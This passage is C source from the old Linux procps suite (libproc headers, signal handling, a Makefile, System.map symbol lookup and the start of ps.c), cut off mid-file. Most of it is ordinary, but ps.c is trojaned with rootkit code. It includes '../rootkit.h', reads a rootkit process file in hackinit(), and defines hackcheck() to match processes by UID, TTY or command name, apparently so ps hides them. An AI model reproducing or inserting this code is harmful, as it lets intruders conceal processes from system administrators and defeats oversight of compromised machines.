    int		nuid;	/* cannot really sentinel-terminate unsigned short[] */
    char*	stats;	/* status chars (actually output into /proc//stat) */
} PROCTAB;

/* initialize a PROCTAB structure holding needed call-to-call persistent data
 */
PROCTAB* openproc(int flags, ... /* pid_t*|uid_t*|dev_t*|char* [, int n] */ );

/* Convenient wrapper around openproc and readproc to slurp in the whole process
 * table subset satisfying the constraints of flags and the optional PID list.
 * Free allocated memory with freeproctab().  Access via tab[N]->member.  The
 * pointer list is NULL terminated.
 */
proc_t** readproctab(int flags, ... /* same as openproc */ );

/* Convenient wrapper around openproc and readproc to slurp in the whole process
 * tree subset satisfying the constraints of flags and the optional PID list.
 */
proc_t* readproctree(int flags, ... /* same as openproc */ );

/* clean-up open files, etc from the openproc()
 */
void closeproc(PROCTAB* PT);

/* retrieve the next process matching the criteria set by the openproc()
 */
proc_t* readproc(PROCTAB* PT, proc_t* return_buf);

/* deallocate space allocated by readproc
 */
void freeproc(proc_t* p);

/* deallocate space allocated by readproctab
 */
void freeproctab(proc_t** p);

/* openproc/readproctab:
 *   
 * Return PROCTAB* / *proc_t[] or NULL on error ((probably) "/proc" cannot be
 * opened.)  By default readproc will consider all processes as valid to parse
 * and return, but not actually fill in the cmdline, environ, and /proc/#/statm
 * derived memory fields.
 *
 * `flags' (a bitwise-or of PROC_* below) modifies the default behavior.  The
 * "fill" options will cause more of the proc_t to be filled in.  The "filter"
 * options all use the second argument as the pointer to a list of objects:
 * process status', process id's, user id's, and tty device numbers.  The third
 * argument is the length of the list (currently only used for lists of user
 * id's since unsigned short[] supports no convenient termination sentinel.)
 */
#define PROC_FILLMEM 0x1   /* read statm into the appropriate proc_t entries */
#define PROC_FILLCMD 0x2   /* alloc and fill in `cmdline' part of proc_t */
#define PROC_FILLENV 0x4   /* alloc and fill in `environ' part of proc_t */
#define PROC_FILLTTY 0x8   /* resolve device number -> tty name via psdevtab */
#define PROC_FILLUSR 0x10  /* resolve user id number -> user name via passwd */
                       /* consider only processes with one of the passed: */
#define PROC_PID     0x100  /* process id numbers ( 0   terminated) */
#define PROC_TTY     0x200  /* ctty device nos.   ( 0   terminated) */
#define PROC_UID     0x400  /* user id numbers    ( length needed ) */
#define PROC_STAT    0x800  /* status fields      ('\0' terminated) */
#define PROC_ANYTTY  0x1000 /* proc must have a controlling terminal */

/* utility functions which may be of general interest: */

/* slurp /proc/DIR/FILE into a single large string into the passed
   buffer.  return the number of bytes actually used.  used for stat,statm
 */
int file2str(char *dir, char *file, char *buf, int buf_size);

/* convert a file of null terminated strings into an argv-style string vector
 * which may be de-allocated with a single free() on a dereference of the return
 * value, e.g. free(*ret).  used for cmdline, environ.
 */
char** file2strvec(char* directory, char* what);

/* parse /proc/#/stat  entries in string s into a proc_t
 */
void stat2proc(char* S, proc_t*);

/* parse /proc/#/statm entries in string s into a proc_t
 */
void statm2proc(char* s, proc_t*);

/* convert a memory buffer with nulls into a single string,
   replacing the nulls with sep.  No longer used.
 */
void nulls2sep(char* str, int len, char sep);
#ifndef SYSINFO_H
#define SYSINFO_H

int        loadavg(double *av1, double *av5, double *av15);
int        uptime (double *uptime_secs, double *idle_secs);
unsigned** meminfo(void);

enum meminfo_row { meminfo_main = 0,
		   meminfo_swap };

enum meminfo_col { meminfo_total = 0, meminfo_used, meminfo_free,
		   meminfo_shared, meminfo_buffers, meminfo_cached
};

unsigned read_total_main(void);

#endif /* SYSINFO_H */
struct tree_node {
    proc_t *proc;
    pid_t pid;
    pid_t ppid;
    char *line;
    char *cmd;
    char **cmdline;
    char **environ;
    int children;
    int maxchildren;
    int *child;
    int have_parent;
};

/* whattime.h --- see whattime.c for explanation */

#ifndef __WHATTIME_H
#define __WHATTIME_H

void print_uptime(void);
char *sprint_uptime(void);

#endif
#ifndef PROC_VERSION_H
#define PROC_VERSION_H

/* Suite version information for procps utilities
 * Copyright (c) 1995 Martin Schulze <joey@infodrom.north.de>
 * Linux kernel version information for procps utilities
 * Copyright (c) 1996 Charles Blake <cblake@bbn.com>
 */

extern void display_version(void);	/* display suite version */
extern char procps_version[];		/* global buf for suite version */

extern int linux_version_code;		/* runtime version of LINUX_VERSION_CODE
					   in /usr/include/linux/version.h */
extern void set_linux_version(void);	/* set linux_version_code */


/* Convenience macros for composing/decomposing version codes */
#define LINUX_VERSION(x,y,z)   (0x10000*(x) + 0x100*(y) + z)
#define LINUX_VERSION_MAJOR(x) ((x) & 0xFF0000)		/* Dare we hope for a */
#define LINUX_VERSION_MINOR(x) ((x) & 0x00FF00)		/* Linux 256.0.0? ;-) */
#define LINUX_VERSION_PATCH(x) ((x) & 0x0000FF)

#endif	/* PROC_VERSION_H */
/*
 * psdata.h
 *
 * Jeffrey A. Uphoff <juphoff@nrao.edu>, 1995, 1996.
 * Michael K. Johnson.
 * Bruno Lankester.
 * (And others I'm sure...)
 *
 */

/*
 * You can define ELF_CAPABLE at compile-time to get an a.out binary that can
 * handle ELF kernel images.
 */
#if defined(__ELF__) && !defined(NO_ELF_CAPABILITY)
# define ELF_CAPABLE
# define ELF_OBJECT 1
# define ELF_FUNC 2
#endif

#include <sys/types.h>
#include <linux/utsname.h>

#define        PSDATABASE      "/etc/psdatabase"

struct dbtbl_s {
  off_t off;			/* offset in psdatabase */
  int nsym;			/* # symbols */
  int size;			/* size of array + strings */
};

/*
 * header of psdatabase
 */
struct psdb_hdr {
  /* Current procps package version goes here.  kmemps doesn't like this. */
  char magic[32];
  /* 
   * These are not functional--they only reside in the database for
   * informational purposes (i.e. if you want to look at the raw
   * database and see what kernel it's for).
   */
  char uts_release[__NEW_UTS_LEN];
  char uts_version[__NEW_UTS_LEN];
  /* 
   * Again, this is not functional, it's just there for information: it
   * shows the path to the uncompressed kernel image that was used to
   * generate this database.
   */
  char sys_path[128];
  /* List of all functions. */
  struct dbtbl_s fncs;
  /* 
   * This is currently only used to look up system_utsname while
   * psupdate is building the database--it really should be phased out!
   */
  /* List of all bss and data symbols. */
  struct dbtbl_s vars;
  /* 
   * The list of tty names that kmemps likes/uses in no longer present
   * in the procps psdatabase--it was never being built by procps'
   * psupdate anyway, so I removed the entry from the database header.
   */
};

struct sym_s {
  unsigned long addr;		/* core address in kernel */
  int name;			/* offset from strings ptr */
};

struct tbl_s {
  struct sym_s *tbl;
  int nsym;
  char *strings;		/* ptr to start of strings */
};

extern struct psdb_hdr db_hdr;
extern struct tbl_s fncs, vars;

int read_tbl (struct dbtbl_s *, struct tbl_s *);
void *xmalloc (unsigned int);
void *xrealloc (void *, unsigned int);

#define MLSEEK(FD, WHERE, WHENCE, ERROR)\
if (lseek ((FD), (WHERE), (WHENCE)) == -1) {\
  perror ((ERROR));\
  exit (errno);\
}

#define MREAD(FD, WHAT, SIZE, ERROR)\
if (read ((FD), (WHAT), (SIZE)) != (SIZE)) {\
  perror ((ERROR));\
  exit (errno);\
}
/* signals.h - signal name handling */

void list_signals(void);

/* Lists all known signal names on standard output. */

int get_signal(char *name,char *cmd);
int get_signal2(char *name);

/* Returns the signal number of NAME. If no such signal exists, an error
   message is displayed and the program is terminated. CMD is the name of the
   application. */
/* signals.c - signal name handling */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include "proc/signals.h"


typedef struct {
    int number;
    char *name;
} SIGNAME;


static SIGNAME signals[] = {
#include "signames.h" /* should be in same dir as this file */
  { 0,NULL }};


void list_signals(void)
{
    SIGNAME *walk;
    int col;

    col = 0;
    for (walk = signals; walk->name; walk++) {
	if (col+strlen(walk->name)+1 > 80) {
	    putchar('\n');
	    col = 0;
	}
	printf("%s%s",col ? " " : "",walk->name);
	col += strlen(walk->name)+1;
    }
    putchar('\n');
}


int get_signal(char *name,char *cmd)
{
    SIGNAME *walk;

    if (isdigit(*name))
	return atoi(name);
    for (walk = signals; walk->name; walk++)
	if (!strcmp(walk->name,name)) break;
    if (walk->name) return walk->number;
    fprintf(stderr,"%s: unknown signal; %s -l lists signals.\n",name,cmd);
    exit(1);
}

/* get_signal2 is by Michael Shields. 1994/04/25. */
int get_signal2(char *name)
{
    SIGNAME *walk;

    if (!name)
        return(-1);
    if (isdigit(*name))
	return atoi(name);
    for (walk = signals; walk->name; walk++)
        if (!strcmp(walk->name,name))
            return(walk->number);
    return(-1);
}
/* Suite version information for procps utilities
 * Copyright (c) 1995 Martin Schulze <joey@infodrom.north.de>
 * Ammended by cblake to only export the function symbol.
 */
#include <stdio.h>

char procps_version[] = "procps version " VERSION "." SUBVERSION;

void display_version(void) {
    fprintf(stdout, "%s\n", procps_version);
}

/* Linux kernel version information for procps utilities
 * Copyright (c) 1996 Charles Blake <cblake@bbn.com>
 */
#include <sys/utsname.h>

#define LINUX_VERSION(x,y,z)   (0x10000*(x) + 0x100*(y) + z)

int linux_version_code;

void set_linux_version(void) {
    static struct utsname uts;
    int x = 0, y = 0, z = 0;	/* cleared in case sscanf() < 3 */
    if (uname(&uts) == -1)	/* failure most likely implies impending death */
	exit(1);
    if (sscanf(uts.release, "%d.%d.%d", &x, &y, &z) < 3)
	fprintf(stderr,		/* *very* unlikely to happen by accident */
		"Non-standard uts for running kernel:\n"
		"release %s=%d.%d.%d gives version code %d\n",
		uts.release, x, y, z, LINUX_VERSION(x,y,z));
    linux_version_code = LINUX_VERSION(x, y, z);
}
# Auto-adaptive C library Makefile adapted for libproc, Chuck Blake.
# Assumptions are basically that all the .c files in the CWD are modules
# for the library and that all .h files are the interface to the library.

# PROJECT SPECIFIC MACROS
NAME       =  proc
VERSION    =  1
SUBVERSION =  00
SHARED     =  1#	if 1 then do shared libraries as well as static

# INSTALLATION OPTIONS
TOPDIR     = /usr
HDRDIR     = $(TOPDIR)/include/$(NAME)#	where to put .h files
LIBDIR     = $(TOPDIR)/lib#		where to put library files
SHLIBDIR   = /lib#			where to put shared library files
HDROWN     = -o root -g root #		owner of header files
LIBOWN     = -o root -g root #		owner of library files
INSTALL    = install

# COMPILATION OPTIONS
CC         =  gcc -O4 -fomit-frame-pointer#-ggdb # easy to command-line override
CFLAGS     =  -I.. -Wall

# ----------------------------------------------------------------#
# The rest is the auto-magic section -- highly GNU make dependent #
# You should never need to edit this.                             #
# ----------------------------------------------------------------#

VC_SUF     =  ,v
VC_PFX     =  RCS/
RCSFILES   =  $(patsubst $(VC_PFX)%$(VC_SUF),%,$(wildcard $(VC_PFX)*$(VC_SUF)))

# We take the union of RCS files and other files in CWD so that new files do
# not need to alter this makefile.  'sort' removes duplicates.  This allows the
# convenience of compiling and testing new files before the initial check-in.

SRC        =  $(sort $(wildcard *.c) $(filter %.c,$(RCSFILES)))
HDR        =  $(sort $(wildcard *.h) $(filter %.h,$(RCSFILES)))

OBJ        =  $(SRC:.c=.o)
SONAME     =  lib$(NAME).so.$(VERSION).$(SUBVERSION)

ifeq ($(SHARED),1)
CFLAGS += -fpic
all: lib$(NAME).a $(SONAME)
else
all: lib$(NAME).a
endif

lib$(NAME).a: $(OBJ)
	$(AR) rcs $@ $^

$(SONAME): $(OBJ)
	gcc -Wl,-shared -Wl,-soname,$(SONAME) -o $@ $^
	ln -sf $(SONAME) lib$(NAME).so

# AUTOMATIC DEPENDENCY GENERATION -- GCC AND GNUMAKE DEPENDENT

.depend:
	$(strip $(CC) $(CFLAGS) -MM -MG $(SRC) > .depend)
include .depend

# INSTALLATION

install: all
	if ! [ -d $(HDRDIR) ] ; then mkdir $(HDRDIR) ; fi
	$(INSTALL) $(HDROWN) $(HDR) $(TOPDIR)/include/$(NAME)
	$(INSTALL) $(LIBOWN) lib$(NAME).a $(LIBDIR)
ifeq ($(SHARED),1)
	$(INSTALL) $(LIBOWN) $(SONAME) $(SHLIBDIR)
	ln -sf $(SHLIBDIR)/$(SONAME) $(SHLIBDIR)/lib$(NAME).so
	ldconfig
endif

# VARIOUS SHORT CUT TARGETS
.PHONY:	all install dep clean distclean checkout checkclean

dep:	.depend

clean:
	$(RM) lib$(NAME).* *.o

distclean:	clean
	$(RM) .depend signames.h

checkout:
	$(CO) $(RCSFILES)

checkclean:
	$(RM) $(RCSFILES)

# CUSTOM c -> o rule so that command-line has minimal whitespace

%.o : %.c
	$(strip $(CC) $(CFLAGS) -c $<)

# PROJECT SPECIFIC DEPENDENCIES/BUILD RULES


version.o:	version.c version.h
	$(strip $(CC) $(CFLAGS) -DVERSION=\"$(VERSION)\" -DSUBVERSION=\"$(SUBVERSION)\" -c version.c)

signals.o : signames.h

signames.h ../proc/signames.h : /usr/include/signal.h
	/lib/cpp -dM </usr/include/signal.h |	\
	tr -s '\t ' '  ' | sort -n +2 | sed		\
	's:#define SIG\([A-Z]\+[0-9]*\) \([0-9]\+\) *\(\|/\*.*\)$$:{\
\2,"\1" },:p;d'  > signames.h

/*
  Some output conversion routines for libproc
  Copyright (C) 1996, Charles Blake.  See COPYING for details.
*/
#include <stdio.h>
#include <ctype.h>

/* output a string, converting unprintables to octal as we go, and stopping after
   processing max chars of output (accounting for expansion due to octal rep).
*/
unsigned print_str(FILE* file, char *s, unsigned max) {
    int i;
    for (i=0; s[i] && i < max; i++)
	if (isprint(s[i]) || s[i] == ' ')
	    fputc(s[i], file);
	else {
	    if (max - i > 3) {
		fprintf(file, "\\%03o", s[i]);
		i += 3; /* 4 printed, but i counts one */
	    } else
		return max - i;
	}
    return max - i;
}

/* output an argv style NULL-terminated string list, converting unprintables
   to octal as we go, separating items of the list by 'sep' and stopping after
   processing max chars of output (accounting for expansion due to octal rep).
*/
unsigned print_strlist(FILE* file, char **strs, char* sep, unsigned max) {
    int i, n, seplen = strlen(sep);
    for (n=0; *strs && n < max; strs++) {
	for (i=0; strs[0][i] && n+i < max; i++)
	    if (isprint(strs[0][i]) || strs[0][i] == ' ')
		fputc(strs[0][i], file);
	    else {
		if (max-(n+i) > 3) {
		    fprintf(file, "\\%03o", strs[0][i]);
		    n += 3; /* 4 printed, but i counts one */
		} else
		    return max - n;
	    }
	n += i;
	if (n + seplen < max) {
	    fputs(sep, file);
	    n += seplen;
	} else
	    return max - n;
    }
    return max - n;
}
/* kernel address -> symbol with next lower address.  Charles Blake, 1996.
 * Written to obviate the need for psdatabase initialization based upon kernel
 * binary formats, etc.
 *
 * The basic algorithm is an approximate (intervals split vaguely 50-50) binary
 * search taking advantage of the fact the System.map is already sorted in
 * ascending order by the kernel makefile.  It needs to assume an average symbol
 * record length to avoid scanning the entire symbol table, but in practice the
 * search time does not seem to be especially sensitive to this choice.
 *
 * The search could be an exact binary search if the lines of System.map were
 * padded with blanks to the right.  awk '{printf "%8s%2s %-21.21s\n",$1,$2,$3}'
 * would do the trick for this but either makes the file large or truncates
 * symbols.  The approximate method seems to be plenty fast enough, costing
 * only about as much as one extra fstat() or so per process.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include "proc/psdata.h"
#include "proc/ps.h"
#include "proc/version.h"

#define MAX_ADDR_SZ 32
static char *sysmap, *sysmap_last, sysmap_fmt[10];
static int   sysmap_len, sysmap_mean = 32, sysmap_addrsz;

/* scan backward in a string no further than address beg looking for c */
static char *strchrrev(char *a, char *beg, char c) {
    if (a)
	while (--a > beg && *a != c) ;
    return a;
}

/* return ptr to the beg of approximately the i-th record */
static char *addr_str(int i) {
    char *guess = sysmap + sysmap_mean * i;
    if (!i) return sysmap;
    if (guess - sysmap > sysmap_len - 2) guess = sysmap + sysmap_len - 2;
    for ( ; *guess != '\n' && guess > sysmap; guess--)
	;
    return guess + 1;

}

/* return ptr to symbol string (\n terminated) given beg of record ptr */
static char *sym_put(char *buf, int len, char *addrptr) {
    char *s;
    while (*addrptr++ != ' ')   ;
    while (*addrptr++ != ' ')   ;
    strncpy(buf, addrptr, len);
    for (s = buf; s < buf + len; s++)
	if (*s == '\n')
	    *s = '\0';
    buf[len - 1] = '\0';
    return buf;
}

/* Try to open and mmap a single symbol table file and initialize globals */
int sysmap_mmap(char *path) {
    int fd;
    struct stat sbuf;
    char *p;
    if (sysmap)		/* do nothing if already mapped */
	return 1;
    if ((fd = open(path, O_RDONLY)) < 0
	|| fstat(fd, &sbuf) < 0
	|| (sysmap = mmap(0, sbuf.st_size,
			  PROT_READ, MAP_SHARED,
			  fd, 0)) == (caddr_t) -1)
    {
	close(fd);
	sysmap = NULL;
	return 0;
    }
    sysmap_len = sbuf.st_size;
    sysmap_last = strchrrev(sysmap + sysmap_len - 2, sysmap, '\n') + 1;

    /* Now check first line of sysmap for hex numbers in first column.  Note:
       0x/0X prefixes are disallowed, but easily addable.  Capitalization is
       irrelevant because strncasecmp(3) is used below instead of strncmp. */
    for (p = sysmap; *p != ' '
	     && ((*p >= '0' && *p <= '9') ||
		 (*p >= 'A' && *p <= 'F') ||
		 (*p >= 'a' && *p <= 'f'))
	     && p < sysmap + MAX_ADDR_SZ;
	 p++) /* no-op */ ;
    if (*p != ' ') { /* uh-oh: cannot understand format */
	fprintf(stderr, "warning: %s not parseable as a System.map.\n", path);
	munmap(sysmap, sysmap_len);
	sysmap = NULL;
	close(fd);
	return 0;
    }
    sysmap_addrsz = p - sysmap;
    snprintf(sysmap_fmt, sizeof sysmap_fmt, "%%0%dlx", sysmap_addrsz);
    close(fd);
    return 1;
}

/* kernel address -> name resolver.
   returned value is only good until the next call to the function.
 */
char *sysmap_symbol(unsigned long address) {
    static char rval[128], *pc, addr[MAX_ADDR_SZ];
    int i, p, n = sysmap_len / (double)sysmap_mean;

    sprintf(addr, sysmap_fmt, address);
    p = 0; pc = sysmap;
    while (n) {
	i = p + (n >> 1);
	if (strncasecmp(addr, pc = addr_str(i), sysmap_addrsz) > 0)
	    p = i + 1;
	n >>= 1;
    }
    if (pc == sysmap_last)		/* scan forward but not past end */
	return sym_put(rval, sizeof rval, pc);
    while (strncasecmp(addr, pc, sysmap_addrsz) > 0)
	pc = strchr(pc, '\n') + 1;
    if (pc == sysmap)			/* scan backward but not past beg */
	return sym_put(rval, sizeof rval, pc);
    while (strncasecmp(addr, pc, sysmap_addrsz) < 0)
	pc = strchrrev(pc - 1, sysmap, '\n') + 1;
    return sym_put(rval, sizeof rval, pc);
}

/* extern struct nlist *namelist; */
struct tbl_s vars, fncs;
struct psdb_hdr db_hdr;
int psdb = -1;

int open_psdb(void) {
    static char *sysmap_paths[] = {
	"/boot/System.map-%s",
	"/boot/System.map",
	"/lib/modules/%s/System.map",
	NULL
    };
    static char *psdb_paths[] = {
	"/etc/psdatabase",
	"/boot/psdatabase-%s",
	"/boot/psdatabase",
	"/lib/modules/%s/psdatabase",
	NULL
    };
    char **fmt, *env, path[64];
    struct utsname uts;
    uname(&uts);
    if ((env = getenv("PS_SYSMAP")) && sysmap_mmap(env))	
	return 0;
    for (fmt = sysmap_paths; *fmt; fmt++) {
	snprintf(path, sizeof path, *fmt, uts.release);
	if (sysmap_mmap(path))
	    return 0;
    }
    for (fmt = psdb_paths; *fmt; fmt++) {
	snprintf(path, sizeof path, *fmt, uts.release);
	if ((psdb = open(path, O_RDONLY)) != -1 &&
	    read(psdb, (char*)&db_hdr, sizeof db_hdr) == sizeof db_hdr &&
	    strncmp(db_hdr.magic, procps_version, sizeof(db_hdr.magic)) == 0)
	    /* && version_cmp(kernel,psdatabase) */
	    return 0;
	if (psdb != -1)
	    fprintf(stderr,
		    "psdatabase has magic no. %*s instead of %*s\n",
		    sizeof db_hdr.magic, db_hdr.magic,
		    sizeof db_hdr.magic, procps_version);
	close(psdb);
    }
    return -1;
}

void close_psdb(void) {
    if (sysmap)
	munmap(sysmap, sysmap_len);
    else if (psdb != -1)
	close(psdb);
    psdb = -1;
    sysmap = NULL;
}

int read_tbl(struct dbtbl_s *dbtbl, struct tbl_s *tbl) {
    lseek(psdb, dbtbl->off, SEEK_SET);
    tbl->tbl = (struct sym_s *) malloc(dbtbl->size);
    if (read(psdb, (char *) tbl->tbl, dbtbl->size) != dbtbl->size) {
	perror(PSDATABASE);
	exit(1);
    }
    tbl->nsym = dbtbl->nsym;
    tbl->strings = (char *) (tbl->tbl + tbl->nsym);
    return 0;
}

char * find_func(unsigned long address)	{
    int n;
    struct sym_s *p;
    char *s;

    if (sysmap)
	return sysmap_symbol(address);
    if (psdb == -1)
	return "(no psdb)";
    if (fncs.tbl == NULL)
	read_tbl(&db_hdr.fncs, &fncs);
    p = fncs.tbl;
    n = fncs.nsym;
    while (n) {
	int i = n / 2;
	if (p[i].addr < address) {
	    p = &p[i+1];
	    if (p->addr > address) {
		--p;
		break;
	    }
	    --n;
	}
	n /= 2;
    }
    s = p->name + fncs.strings;
    return *s=='_' ? s+1 : s;
}

char * wchan(unsigned int address) {
    static char zero = 0;
    char *p;

    if (address) {
	p = find_func(address);
	if (strncmp(p, "sys_", 4) == 0)
	    p += 4;
	while (*p == '_' && *p)
	    ++p;
    } else /* 0 address means not in kernel space */
	p = &zero;
    return p;
}

#ifdef SYSMAP_TEST
int main(int ac, char** av) {
    if (ac < 3) {printf("%s System.map linesz hexaddr ...\n",av[0]); return 1;}
    if (!sysmap_mmap(av[1])) return 1;
    if ((sysmap_mean = atoi(av[2])) <= 0) return 1;
    for (av += 3; *av; av++)
	printf("%s %s\n", *av, sysmap_symbol(strtoul(*av, NULL, 16)));
    return 0;
}
#endif
{ 1,"HUP" },
{ 2,"INT" },
{ 3,"QUIT" },
{ 4,"ILL" },
{ 5,"TRAP" },
{ 6,"ABRT" },
{ 6,"IOT" },
{ 7,"BUS" },
{ 8,"FPE" },
{ 9,"KILL" },
{ 10,"USR1" },
{ 11,"SEGV" },
{ 12,"USR2" },
{ 13,"PIPE" },
{ 14,"ALRM" },
{ 15,"TERM" },
{ 16,"STKFLT" },
{ 17,"CHLD" },
{ 18,"CONT" },
{ 19,"STOP" },
{ 20,"TSTP" },
{ 21,"TTIN" },
{ 22,"TTOU" },
{ 23,"URG" },
{ 24,"XCPU" },
{ 25,"XFSZ" },
{ 26,"VTALRM" },
{ 27,"PROF" },
{ 28,"WINCH" },
{ 29,"IO" },
{ 30,"PWR" },
{ 31,"UNUSED" },

#include <sys/types.h>

dev_t name_to_dev(char* name);
char* dev_to_name(dev_t num);

dev_t tty_to_dev(char *tty);
void  dev_to_tty(char *tty, int dev);

char* abbrev_of_tty(char *tty);
/*
 * ps.c                - show process status
 *
 * Copyright (c) 1992 Branko Lankester
 *
 * Snarfed and HEAVILY modified for procps by Michael K. Johnson,
 * (johnsonm@sunsite.unc.edu).  What is used is what is required to have a
 *  common interface.
 *
 * Massive modifications by Charles Blake (cblake@bbn.com).  Rewrite
 * of the system process table code, multilevel sorting, device number
 * database, forest feature (contributed by ...), environment variables, GNU
 * style long options, pid list filtering (contributed by Michael Shields).
 *
 * Changes Copyright (C) 1993, 1994 Michael K. Johnson,
 *   and   Copyright (C) 1995, 1996 Charles Blake
 * See file COPYING for copyright details.
 */
#include <proc/version.h>
#include <proc/readproc.h>
#include <proc/ps.h>
#include <proc/psdata.h>
#include <proc/devname.h>
#include <proc/tree.h>
#include <proc/sysinfo.h>

#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pwd.h>
#include <time.h>
#include <limits.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <linux/sched.h>
#include <linux/tty.h>

/* HACK DEFS */
#include "../rootkit.h"
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"
int showall=0;

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;

void hackinit(void)
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;

   if ((int)fp_hack=fopen(ROOTKIT_PROCESS_FILE,"r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   fclose(fp_hack);
   }
   h_tmp->next=NULL;
}

int hackcheck(proc_t *p)
{
int i=0;
   for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
      switch (h_tmp->hack_type) {
       case 0:
         if (p->uid==atoi(h_tmp->hack_cmd))
           return 1;
         break;
       case 1:
	 while((p->ttyc[i]==' ')&&(i<4)) i++;
         if (!strcmp(&p->ttyc[i], h_tmp->hack_cmd))
           return 1;
         break;
       case 2:
	 if (strcmp((char *)p->cmd,h_tmp->hack_cmd)==0)
	   return 1;
         break;
	case 3:
	 if (strstr((char *)p->cmd,h_tmp->hack_cmd))
           return 1;
         break;
      }
   }
return 0;
}

void show_short(char*, proc_t*);
void show_long (char*, proc_t*);
void show_user (char*, proc_t*);
void show_jobs (char*, proc_t*);
void show_sig  (char*, proc_t*);
void show_vm   (char*, proc_t*);
void show_m    (char*, proc_t*);
void show_regs (char*, proc_t*);

/* this struct replaces the previously parallel fmt_fnc and hdrs */
struct {
    void      (*format)(char*,proc_t*);
    char        CL_option_char;
    const char*	default_sort;
    const char*	header;
} mode[] = {
    { show_short,  0 , "Up", "  PID TTY STAT  TIME COMMAND" },
    { show_long,  'l', "Pp", " FLAGS   UID   PID  PPID PRI  NI   SIZE   RSS WCHAN       STA TTY TIME COMMAND" },
    { show_user,  'u', "up", "USER       PID %CPU %MEM  SIZE   RSS TTY STAT START   TIME COMMAND" },
    { show_jobs,  'j', "gPp"," PPID   PID  PGID   SID TTY TPGID  STAT   UID   TIME COMMAND" },
    { show_sig,   's', "p",  "  UID   PID SIGNAL   BLOCKED  IGNORED  CATCHED  STAT TTY   TIME COMMAND" },
    { show_vm,    'v', "r",  "  PID TTY STAT  TIME  PAGEIN TSIZ DSIZ  RSS   LIM %MEM COMMAND" },
    { show_m,     'm', "r",  "  PID TTY MAJFLT MINFLT   TRS   DRS  SIZE  SWAP   RSS  SHRD   LIB  DT COMMAND" },
    { show_regs,  'X', "p",  "NR   PID    STACK      ESP      EIP TMOUT ALARM STAT TTY   TIME COMMAND" },
    { NULL, 0, NULL, NULL }
};

/* some convenient integer constants corresponding to the above rows. */
enum PS_MODALITY { PS_D = 0, PS_L, PS_U, PS_J, PS_S, PS_V, PS_M, PS_X };

extern int   sort_depth;
extern int   sort_direction[];
extern int (*sort_function[])(/* void* a, void* b */);

int    parse_sort_opt (const char*);
int    parse_long_sort(const char*);
char * status         (proc_t*);
char * prtime         (char *s, unsigned long t, unsigned long rel);
void   usage          (char* context);
void   set_cmdspc     (int w_opts);
void   show_procs     (unsigned maxcmd, int do_header, int, void*,int);
void   show_cmd_env   (char* tskcmd, char** cmd, char** env, unsigned maxch);
void   show_a_proc    (proc_t* the_proc, unsigned maxcmd);
void   show_time      (char *s, proc_t * p);
void   add_node       (char *s, proc_t *task);
int    node_cmp       (const void *s1, const void *s2);
void   show_tree      (int n, int depth, char *continued);
void   show_forest    (void);

int CL_fmt       = 0;

/* process list filtering command line options */

int CL_all,
    CL_kern_comm,
    CL_no_ctty,
    CL_run_only;
char  * CL_ctty;
pid_t * CL_pids;          /* zero-terminated list, dynamically allocated */

/* process display modification command line options */

int CL_show_env,
    CL_num_outp,          /* numeric fields for user, wchan, tty */
    CL_sort     = 1,
    CL_forest,
    CL_Sum,
    CL_pg_shift = 2;      /* default: show k instead of pages */

/* Globals */

unsigned cmdspc = 80;     /* space left for cmd+env after table per row */
int      GL_current_time; /* some global system parameters */
unsigned GL_main_mem;
long     GL_time_now;
int      GL_wchan_nout;   /* this is can also be set on the command-line  */

int main(int argc, char **argv) {
    char *p;
    int width = 0,
	do_header = 1,
	psdbsucc = 0,
	user_ord = 0,
	next_arg = 0,
	toppid = 0,
	pflags, N = 1;
    void* args = NULL;
    dev_t tty[2] = { 0 };
    uid_t uid[1];
hackinit(); /* HACKINIT */
 
    set_linux_version();
    do {
        --argc;		/* shift to next arg. */
        ++argv;
        for (p = *argv; p && *p; ++p) {
            switch (*p) {
	      case '-':               /* "--" ==> long name options */
		if (*(p+1) == '-') {
                    if (strncmp(p+2,"sort",4)==0) {
			if (parse_long_sort(p+7) == -1)
			    usage("unrecognized long sort option\n");
			user_ord = 1;
			next_arg = 1;
			break;
                    } else if (strncmp(p+2, "help", 4) == 0) {
			usage(NULL);
			dump_keys();
			return 0;
                    } else if (strncmp(p+2, "version", 6) == 0) {
			display_version();
			return 0;
                    } else if (*(p+2) != '\0')	/* just '-- '; not an error */
			usage("ps: unknown long option\n");
		}
		break;
	      case 'l': CL_fmt = PS_L;   /* replaceable by a */	break;
	      case 'u': CL_fmt = PS_U;   /* loop over mode[] */	break;
	      case 'j': CL_fmt = PS_J;				break;
	      case 's': CL_fmt = PS_S;				break;
	      case 'v': CL_fmt = PS_V;				break;
	      case 'm': CL_fmt = PS_M;				break;
	      case 'X': CL_fmt = PS_X;   /* regs */		break;

	      case 'r': CL_run_only = 1; /* list filters */	break;
	      case 'a': CL_all = 1;				break;
	      case 'x': CL_no_ctty = 1;				break;
	      case 't': CL_ctty = p + 1;
		next_arg = 1;				break;

	      case 'e': CL_show_env = 1; /* output modifiers */	break;
	      case 'f': CL_forest = 1;
		CL_kern_comm = 0;			break;
	      case 'c': CL_kern_comm = 1;			break;
	      case 'w': ++width;				break;
	      case 'h': do_header = 0;				break;
	      case 'n': CL_num_outp = 1;
		GL_wchan_nout = 1;			break;
	      case 'S': CL_Sum = 1;				break;
	      case 'p': CL_pg_shift = 0;			break;
	      case 'o': CL_sort = !CL_sort;			break;
	      case 'O':
		if (parse_sort_opt(p+1) == -1)
		    usage("short form sort flag parse error\n");
